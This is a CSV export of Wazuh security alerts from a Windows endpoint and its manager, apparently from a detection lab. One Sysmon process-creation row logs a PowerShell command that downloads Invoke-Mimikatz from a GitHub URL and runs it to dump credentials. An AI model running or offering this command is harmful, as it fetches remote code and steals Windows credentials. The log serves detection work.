@timestamp,agent.name,agent.id,rule.id,rule.description,rule.level,rule.mitre.id,location,raw,severity,data.win.eventdata.commandLine
2025-12-28T22:27:08.885Z,Endpoint3-Win,1,60642,Software protection service scheduled successfully.,3,,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'data': '2025-12-29T21:25:08Z, RulesEngine'}, 'system': {'eventID': '16384', 'eventSourceName': 'Software Protection Platform Service', 'keywords': '0x80000000000000', 'providerGuid': '{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}', 'level': '4', 'channel': 'Application', 'opcode': '0', 'message': '""Successfully scheduled Software Protection service for re-start at 2025-12-29T21:25:08Z. Reason: RulesEngine.""', 'version': '0', 'systemTime': '2025-12-28T22:27:08.1407189Z', 'eventRecordID': '1052', 'threadID': '0', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '0', 'processID': '10300', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Security-SPP'}}}, 'rule': {'firedtimes': 1, 'mail': False, 'level': 3, 'description': 'Software protection service scheduled successfully.', 'groups': ['windows', 'windows_application'], 'id': '60642'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:27:08.885Z', 'location': 'EventChannel', 'id': '1766960828.4925692', 'timestamp': '2025-12-28T23:27:08.885+0100'}",low,
2025-12-28T22:27:09.862Z,Endpoint3-Win,1,92154,Process loaded taskschd.dll module. May be used to create delayed malware execution,4,T1053.005,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'taskschd.dll', 'image': 'C:\\\\Windows\\\\System32\\\\sppsvc.exe', 'product': 'Microsoft® Windows® Operating System', 'signature': 'Microsoft Windows', 'imageLoaded': 'C:\\\\Windows\\\\System32\\\\taskschd.dll', 'description': 'Task Scheduler COM API', 'signed': 'true', 'signatureStatus': 'Valid', 'processGuid': '{411eefe4-ae9c-6951-ce10-000000001000}', 'processId': '10300', 'utcTime': '2025-12-28 22:27:08.104', 'hashes': 'SHA1=BF09E52372CF6663743A6FC58FCDB75D7551CD64,MD5=DF9E41FF2CF7430B4A29B24BB86AB7B0,SHA256=1E3292A4C58708CA4E3A73B82DB0E9CA4A2C1FC640526B9A14337A1A55A36AA7,IMPHASH=E61FD409CB21E6A6EBA2AFE59848CFC8', 'ruleName': 'technique_id=T1053,technique_name=Scheduled Task', 'company': 'Microsoft Corporation', 'fileVersion': '10.0.26100.5074 (WinBuild.160101.0800)', 'user': 'NT AUTHORITY\\\\NETWORK SERVICE'}, 'system': {'eventID': '7', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Image loaded:\r\nRuleName: technique_id=T1053,technique_name=Scheduled Task\r\nUtcTime: 2025-12-28 22:27:08.104\r\nProcessGuid: {411eefe4-ae9c-6951-ce10-000000001000}\r\nProcessId: 10300\r\nImage: C:\\Windows\\System32\\sppsvc.exe\r\nImageLoaded: C:\\Windows\\System32\\taskschd.dll\r\nFileVersion: 10.0.26100.5074 (WinBuild.160101.0800)\r\nDescription: Task Scheduler COM API\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: taskschd.dll\r\nHashes: SHA1=BF09E52372CF6663743A6FC58FCDB75D7551CD64,MD5=DF9E41FF2CF7430B4A29B24BB86AB7B0,SHA256=1E3292A4C58708CA4E3A73B82DB0E9CA4A2C1FC640526B9A14337A1A55A36AA7,IMPHASH=E61FD409CB21E6A6EBA2AFE59848CFC8\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: NT AUTHORITY\\NETWORK SERVICE""', 'version': '3', 'systemTime': '2025-12-28T22:27:08.1083690Z', 'eventRecordID': '11763', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '7', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 4, 'mail': False, 'level': 4, 'description': 'Process loaded taskschd.dll module. May be used to create delayed malware execution', 'groups': ['sysmon', 'sysmon_eid7_detections', 'windows'], 'mitre': {'technique': ['Scheduled Task'], 'id': ['T1053.005'], 'tactic': ['Execution', 'Persistence', 'Privilege Escalation']}, 'id': '92154'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:27:09.862Z', 'location': 'EventChannel', 'id': '1766960829.4927357', 'timestamp': '2025-12-28T23:27:09.862+0100'}",medium,
2025-12-28T22:27:16.695Z,Endpoint3-Win,1,61109,Name resolution for the name wpad timed out,5,,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'addressLength': '128', 'clientPID': '2524', 'address': '02000000C0A86402000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'queryName': 'wpad'}, 'system': {'eventID': '1014', 'keywords': '0x4000000010000000', 'providerGuid': '{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}', 'level': '3', 'channel': 'System', 'opcode': '0', 'message': '""Name resolution for the name wpad timed out after none of the configured DNS servers responded. Client PID 2524.""', 'version': '1', 'systemTime': '2025-12-28T22:27:14.9414176Z', 'eventRecordID': '2283', 'threadID': '3536', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1014', 'processID': '2060', 'severityValue': 'WARNING', 'providerName': 'Microsoft-Windows-DNS-Client'}}}, 'rule': {'firedtimes': 2, 'mail': False, 'level': 5, 'description': 'Name resolution for the name wpad timed out', 'groups': ['windows', 'windows_system'], 'id': '61109'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:27:16.695Z', 'location': 'EventChannel', 'id': '1766960836.4932052', 'timestamp': '2025-12-28T23:27:16.695+0100'}",medium,
2025-12-28T22:27:26.496Z,Endpoint3-Win,1,60106,Windows logon success.,3,T1078,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'subjectLogonId': '0x3e7', 'subjectDomainName': 'WORKGROUP', 'targetLinkedLogonId': '0x0', 'impersonationLevel': '%%1833', 'authenticationPackageName': 'Negotiate', 'targetLogonId': '0x3e7', 'logonProcessName': 'Advapi', 'logonGuid': '{00000000-0000-0000-0000-000000000000}', 'targetUserName': 'SYSTEM', 'keyLength': '0', 'elevatedToken': '%%1842', 'subjectUserSid': 'S-1-5-18', 'processId': '0x32c', 'processName': 'C:\\\\Windows\\\\System32\\\\services.exe', 'targetDomainName': 'NT AUTHORITY', 'targetUserSid': 'S-1-5-18', 'virtualAccount': '%%1843', 'logonType': '5', 'subjectUserName': 'WINDOWSEND-C792$'}, 'system': {'eventID': '4624', 'keywords': '0x8020000000000000', 'providerGuid': '{54849625-5478-4994-a5ba-3e3b0328c30d}', 'level': '0', 'channel': 'Security', 'opcode': '0', 'message': '""An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWINDOWSEND-C792$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t5\r\n\tRestricted Admin Mode:\t-\r\n\tRemote Credential Guard:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tYes\r\n\r\nImpersonation Level:\t\tImpersonation\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tSYSTEM\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E7\r\n\tLinked Logon ID:\t\t0x0\r\n\tNetwork Account Name:\t-\r\n\tNetwork Account Domain:\t-\r\n\tLogon GUID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x32c\r\n\tProcess Name:\t\tC:\\Windows\\System32\\services.exe\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\t-\r\n\tSource Network Address:\t-\r\n\tSource Port:\t\t-\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tAdvapi  \r\n\tAuthentication Package:\tNegotiate\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\t-\r\n\tKey Length:\t\t0\r\n\r\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\r\n\r\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\r\n\r\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""', 'version': '3', 'systemTime': '2025-12-28T22:27:24.7387746Z', 'eventRecordID': '37712', 'threadID': '6916', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '12544', 'processID': '832', 'severityValue': 'AUDIT_SUCCESS', 'providerName': 'Microsoft-Windows-Security-Auditing'}}}, 'rule': {'mail': False, 'level': 3, 'hipaa': ['164.312.b'], 'pci_dss': ['10.2.5'], 'tsc': ['CC6.8', 'CC7.2', 'CC7.3'], 'description': 'Windows logon success.', 'groups': ['windows', 'windows_security', 'authentication_success'], 'nist_800_53': ['AC.7', 'AU.14'], 'gdpr': ['IV_32.2'], 'firedtimes': 12, 'mitre': {'technique': ['Valid Accounts'], 'id': ['T1078'], 'tactic': ['Defense Evasion', 'Persistence', 'Privilege Escalation', 'Initial Access']}, 'id': '60106', 'gpg13': ['7.1', '7.2']}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:27:26.496Z', 'location': 'EventChannel', 'id': '1766960846.4934183', 'timestamp': '2025-12-28T23:27:26.496+0100'}",low,
2025-12-28T22:27:52.957Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/kern.log,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-28T23:27:52.231014+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 163, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-28T23:27:52.231014+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960872.229:432): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=11504 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:27:52.957Z', 'location': '/var/log/kern.log', 'id': '1766960872.4941631', 'timestamp': '2025-12-28T23:27:52.957+0100'}",low,
2025-12-28T22:27:52.957Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-28T23:27:52.231014+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 164, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-28T23:27:52.231014+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960872.229:432): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=11504 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:27:52.957Z', 'location': '/var/log/syslog', 'id': '1766960872.4942063', 'timestamp': '2025-12-28T23:27:52.957+0100'}",low,
2025-12-28T22:27:57.294Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-28T23:27:57.231986+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 165, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-28T23:27:57.231986+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960877.230:433): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=11504 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:27:57.294Z', 'location': '/var/log/syslog', 'id': '1766960877.4942493', 'timestamp': '2025-12-28T23:27:57.294+0100'}",low,
2025-12-28T22:27:57.294Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/kern.log,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-28T23:27:57.231986+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 166, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-28T23:27:57.231986+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960877.230:433): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=11504 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:27:57.294Z', 'location': '/var/log/kern.log', 'id': '1766960877.4942923', 'timestamp': '2025-12-28T23:27:57.294+0100'}",low,
2025-12-28T22:28:07.307Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/kern.log,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-28T23:28:07.272032+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 167, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-28T23:28:07.272032+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960887.269:434): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=11504 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:28:07.307Z', 'location': '/var/log/kern.log', 'id': '1766960887.4943355', 'timestamp': '2025-12-28T23:28:07.307+0100'}",low,
2025-12-28T22:28:07.307Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-28T23:28:07.272032+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 168, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-28T23:28:07.272032+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960887.269:434): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=11504 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:28:07.307Z', 'location': '/var/log/syslog', 'id': '1766960887.4943787', 'timestamp': '2025-12-28T23:28:07.307+0100'}",low,
2025-12-28T22:28:11.436Z,Endpoint3-Win,1,92052,Windows command prompt started by an abnormal process,4,T1059.003,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'Cmd.Exe', 'image': 'C:\\\\Windows\\\\System32\\\\cmd.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-a5b2-6951-630a-000000001000}', 'description': 'Windows Command Processor', 'logonGuid': '{411eefe4-28dc-6951-f5d2-0e0000000000}', 'parentCommandLine': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'processGuid': '{411eefe4-aefa-6951-da10-000000001000}', 'logonId': '0xed2f5', 'parentProcessId': '8760', 'processId': '4780', 'currentDirectory': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\', 'utcTime': '2025-12-28 22:28:10.279', 'hashes': 'SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9', 'parentImage': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'ruleName': 'technique_id=T1059.003,technique_name=Windows Command Shell', 'company': 'Microsoft Corporation', 'commandLine': '\\""cmd.exe\\"" /c powershell.exe \\""IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds\\""', 'integrityLevel': 'High', 'fileVersion': '10.0.26100.7309 (WinBuild.160101.0800)', 'user': 'WINDOWSEND-C792\\\\ayoub', 'terminalSessionId': '1', 'parentUser': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2025-12-28 22:28:10.279\r\nProcessGuid: {411eefe4-aefa-6951-da10-000000001000}\r\nProcessId: 4780\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.7309 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: ""cmd.exe"" /c powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds""\r\nCurrentDirectory: C:\\Users\\ayoub\\AppData\\Local\\Temp\\\r\nUser: WINDOWSEND-C792\\ayoub\r\nLogonGuid: {411eefe4-28dc-6951-f5d2-0e0000000000}\r\nLogonId: 0xED2F5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9\r\nParentProcessGuid: {411eefe4-a5b2-6951-630a-000000001000}\r\nParentProcessId: 8760\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentUser: WINDOWSEND-C792\\ayoub""', 'version': '5', 'systemTime': '2025-12-28T22:28:10.2865634Z', 'eventRecordID': '11797', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 49, 'mail': False, 'level': 4, 'description': 'Windows command prompt started by an abnormal process', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Windows Command Shell'], 'id': ['T1059.003'], 'tactic': ['Execution']}, 'id': '92052'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:28:11.436Z', 'location': 'EventChannel', 'id': '1766960891.4944217', 'timestamp': '2025-12-28T23:28:11.436+0100'}",medium,"\""cmd.exe\"" /c powershell.exe \""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"""
2025-12-28T22:28:11.510Z,Endpoint3-Win,1,92213,Executable file dropped in folder commonly used by malware,15,T1105,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'image': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'processGuid': '{411eefe4-aefa-6951-dc10-000000001000}', 'processId': '11880', 'utcTime': '2025-12-28 22:28:10.577', 'targetFilename': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_e4wsl5f2.nq2.ps1', 'ruleName': 'technique_id=T1059.001,technique_name=PowerShell', 'creationUtcTime': '2025-12-28 22:28:10.577', 'user': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '11', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-12-28 22:28:10.577\r\nProcessGuid: {411eefe4-aefa-6951-dc10-000000001000}\r\nProcessId: 11880\r\nImage: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\ayoub\\AppData\\Local\\Temp\\__PSScriptPolicyTest_e4wsl5f2.nq2.ps1\r\nCreationUtcTime: 2025-12-28 22:28:10.577\r\nUser: WINDOWSEND-C792\\ayoub""', 'version': '2', 'systemTime': '2025-12-28T22:28:10.5812928Z', 'eventRecordID': '11804', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '11', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 90, 'mail': True, 'level': 15, 'description': 'Executable file dropped in folder commonly used by malware', 'groups': ['sysmon', 'sysmon_eid11_detections', 'windows'], 'mitre': {'technique': ['Ingress Tool Transfer'], 'id': ['T1105'], 'tactic': ['Command and Control']}, 'id': '92213'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:28:11.510Z', 'location': 'EventChannel', 'id': '1766960891.4951391', 'timestamp': '2025-12-28T23:28:11.510+0100'}",critical,
2025-12-28T22:28:12.982Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/kern.log,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-28T23:28:12.275702+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 169, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-28T23:28:12.275702+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960892.273:435): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=11504 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:28:12.982Z', 'location': '/var/log/kern.log', 'id': '1766960892.4954474', 'timestamp': '2025-12-28T23:28:12.982+0100'}",low,
2025-12-28T22:28:12.982Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,"{'predecoder': {'program_name': 'kernel', 'timestamp': '2025-12-28T23:28:12.275702+01:00'}, 'agent': {'name': 'wazuh-vm', 'id': '000'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'extra_data': 'open', 'status': 'DENIED'}, 'rule': {'firedtimes': 170, 'mail': False, 'level': 3, 'description': 'Apparmor DENIED', 'groups': ['local', 'syslog', 'apparmor'], 'id': '52002'}, 'decoder': {'parent': 'kernel', 'name': 'kernel'}, 'full_log': '2025-12-28T23:28:12.275702+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960892.273:435): apparmor=""DENIED"" operation=""open"" class=""file"" profile=""snap.firefox.firefox"" name=""/proc/pressure/memory"" pid=11504 comm=""MemoryPoller"" requested_mask=""r"" denied_mask=""r"" fsuid=1001 ouid=0', 'input': {'type': 'log'}, '@timestamp': '2025-12-28T22:28:12.982Z', 'location': '/var/log/syslog', 'id': '1766960892.4954906', 'timestamp': '2025-12-28T23:28:12.982+0100'}",low,
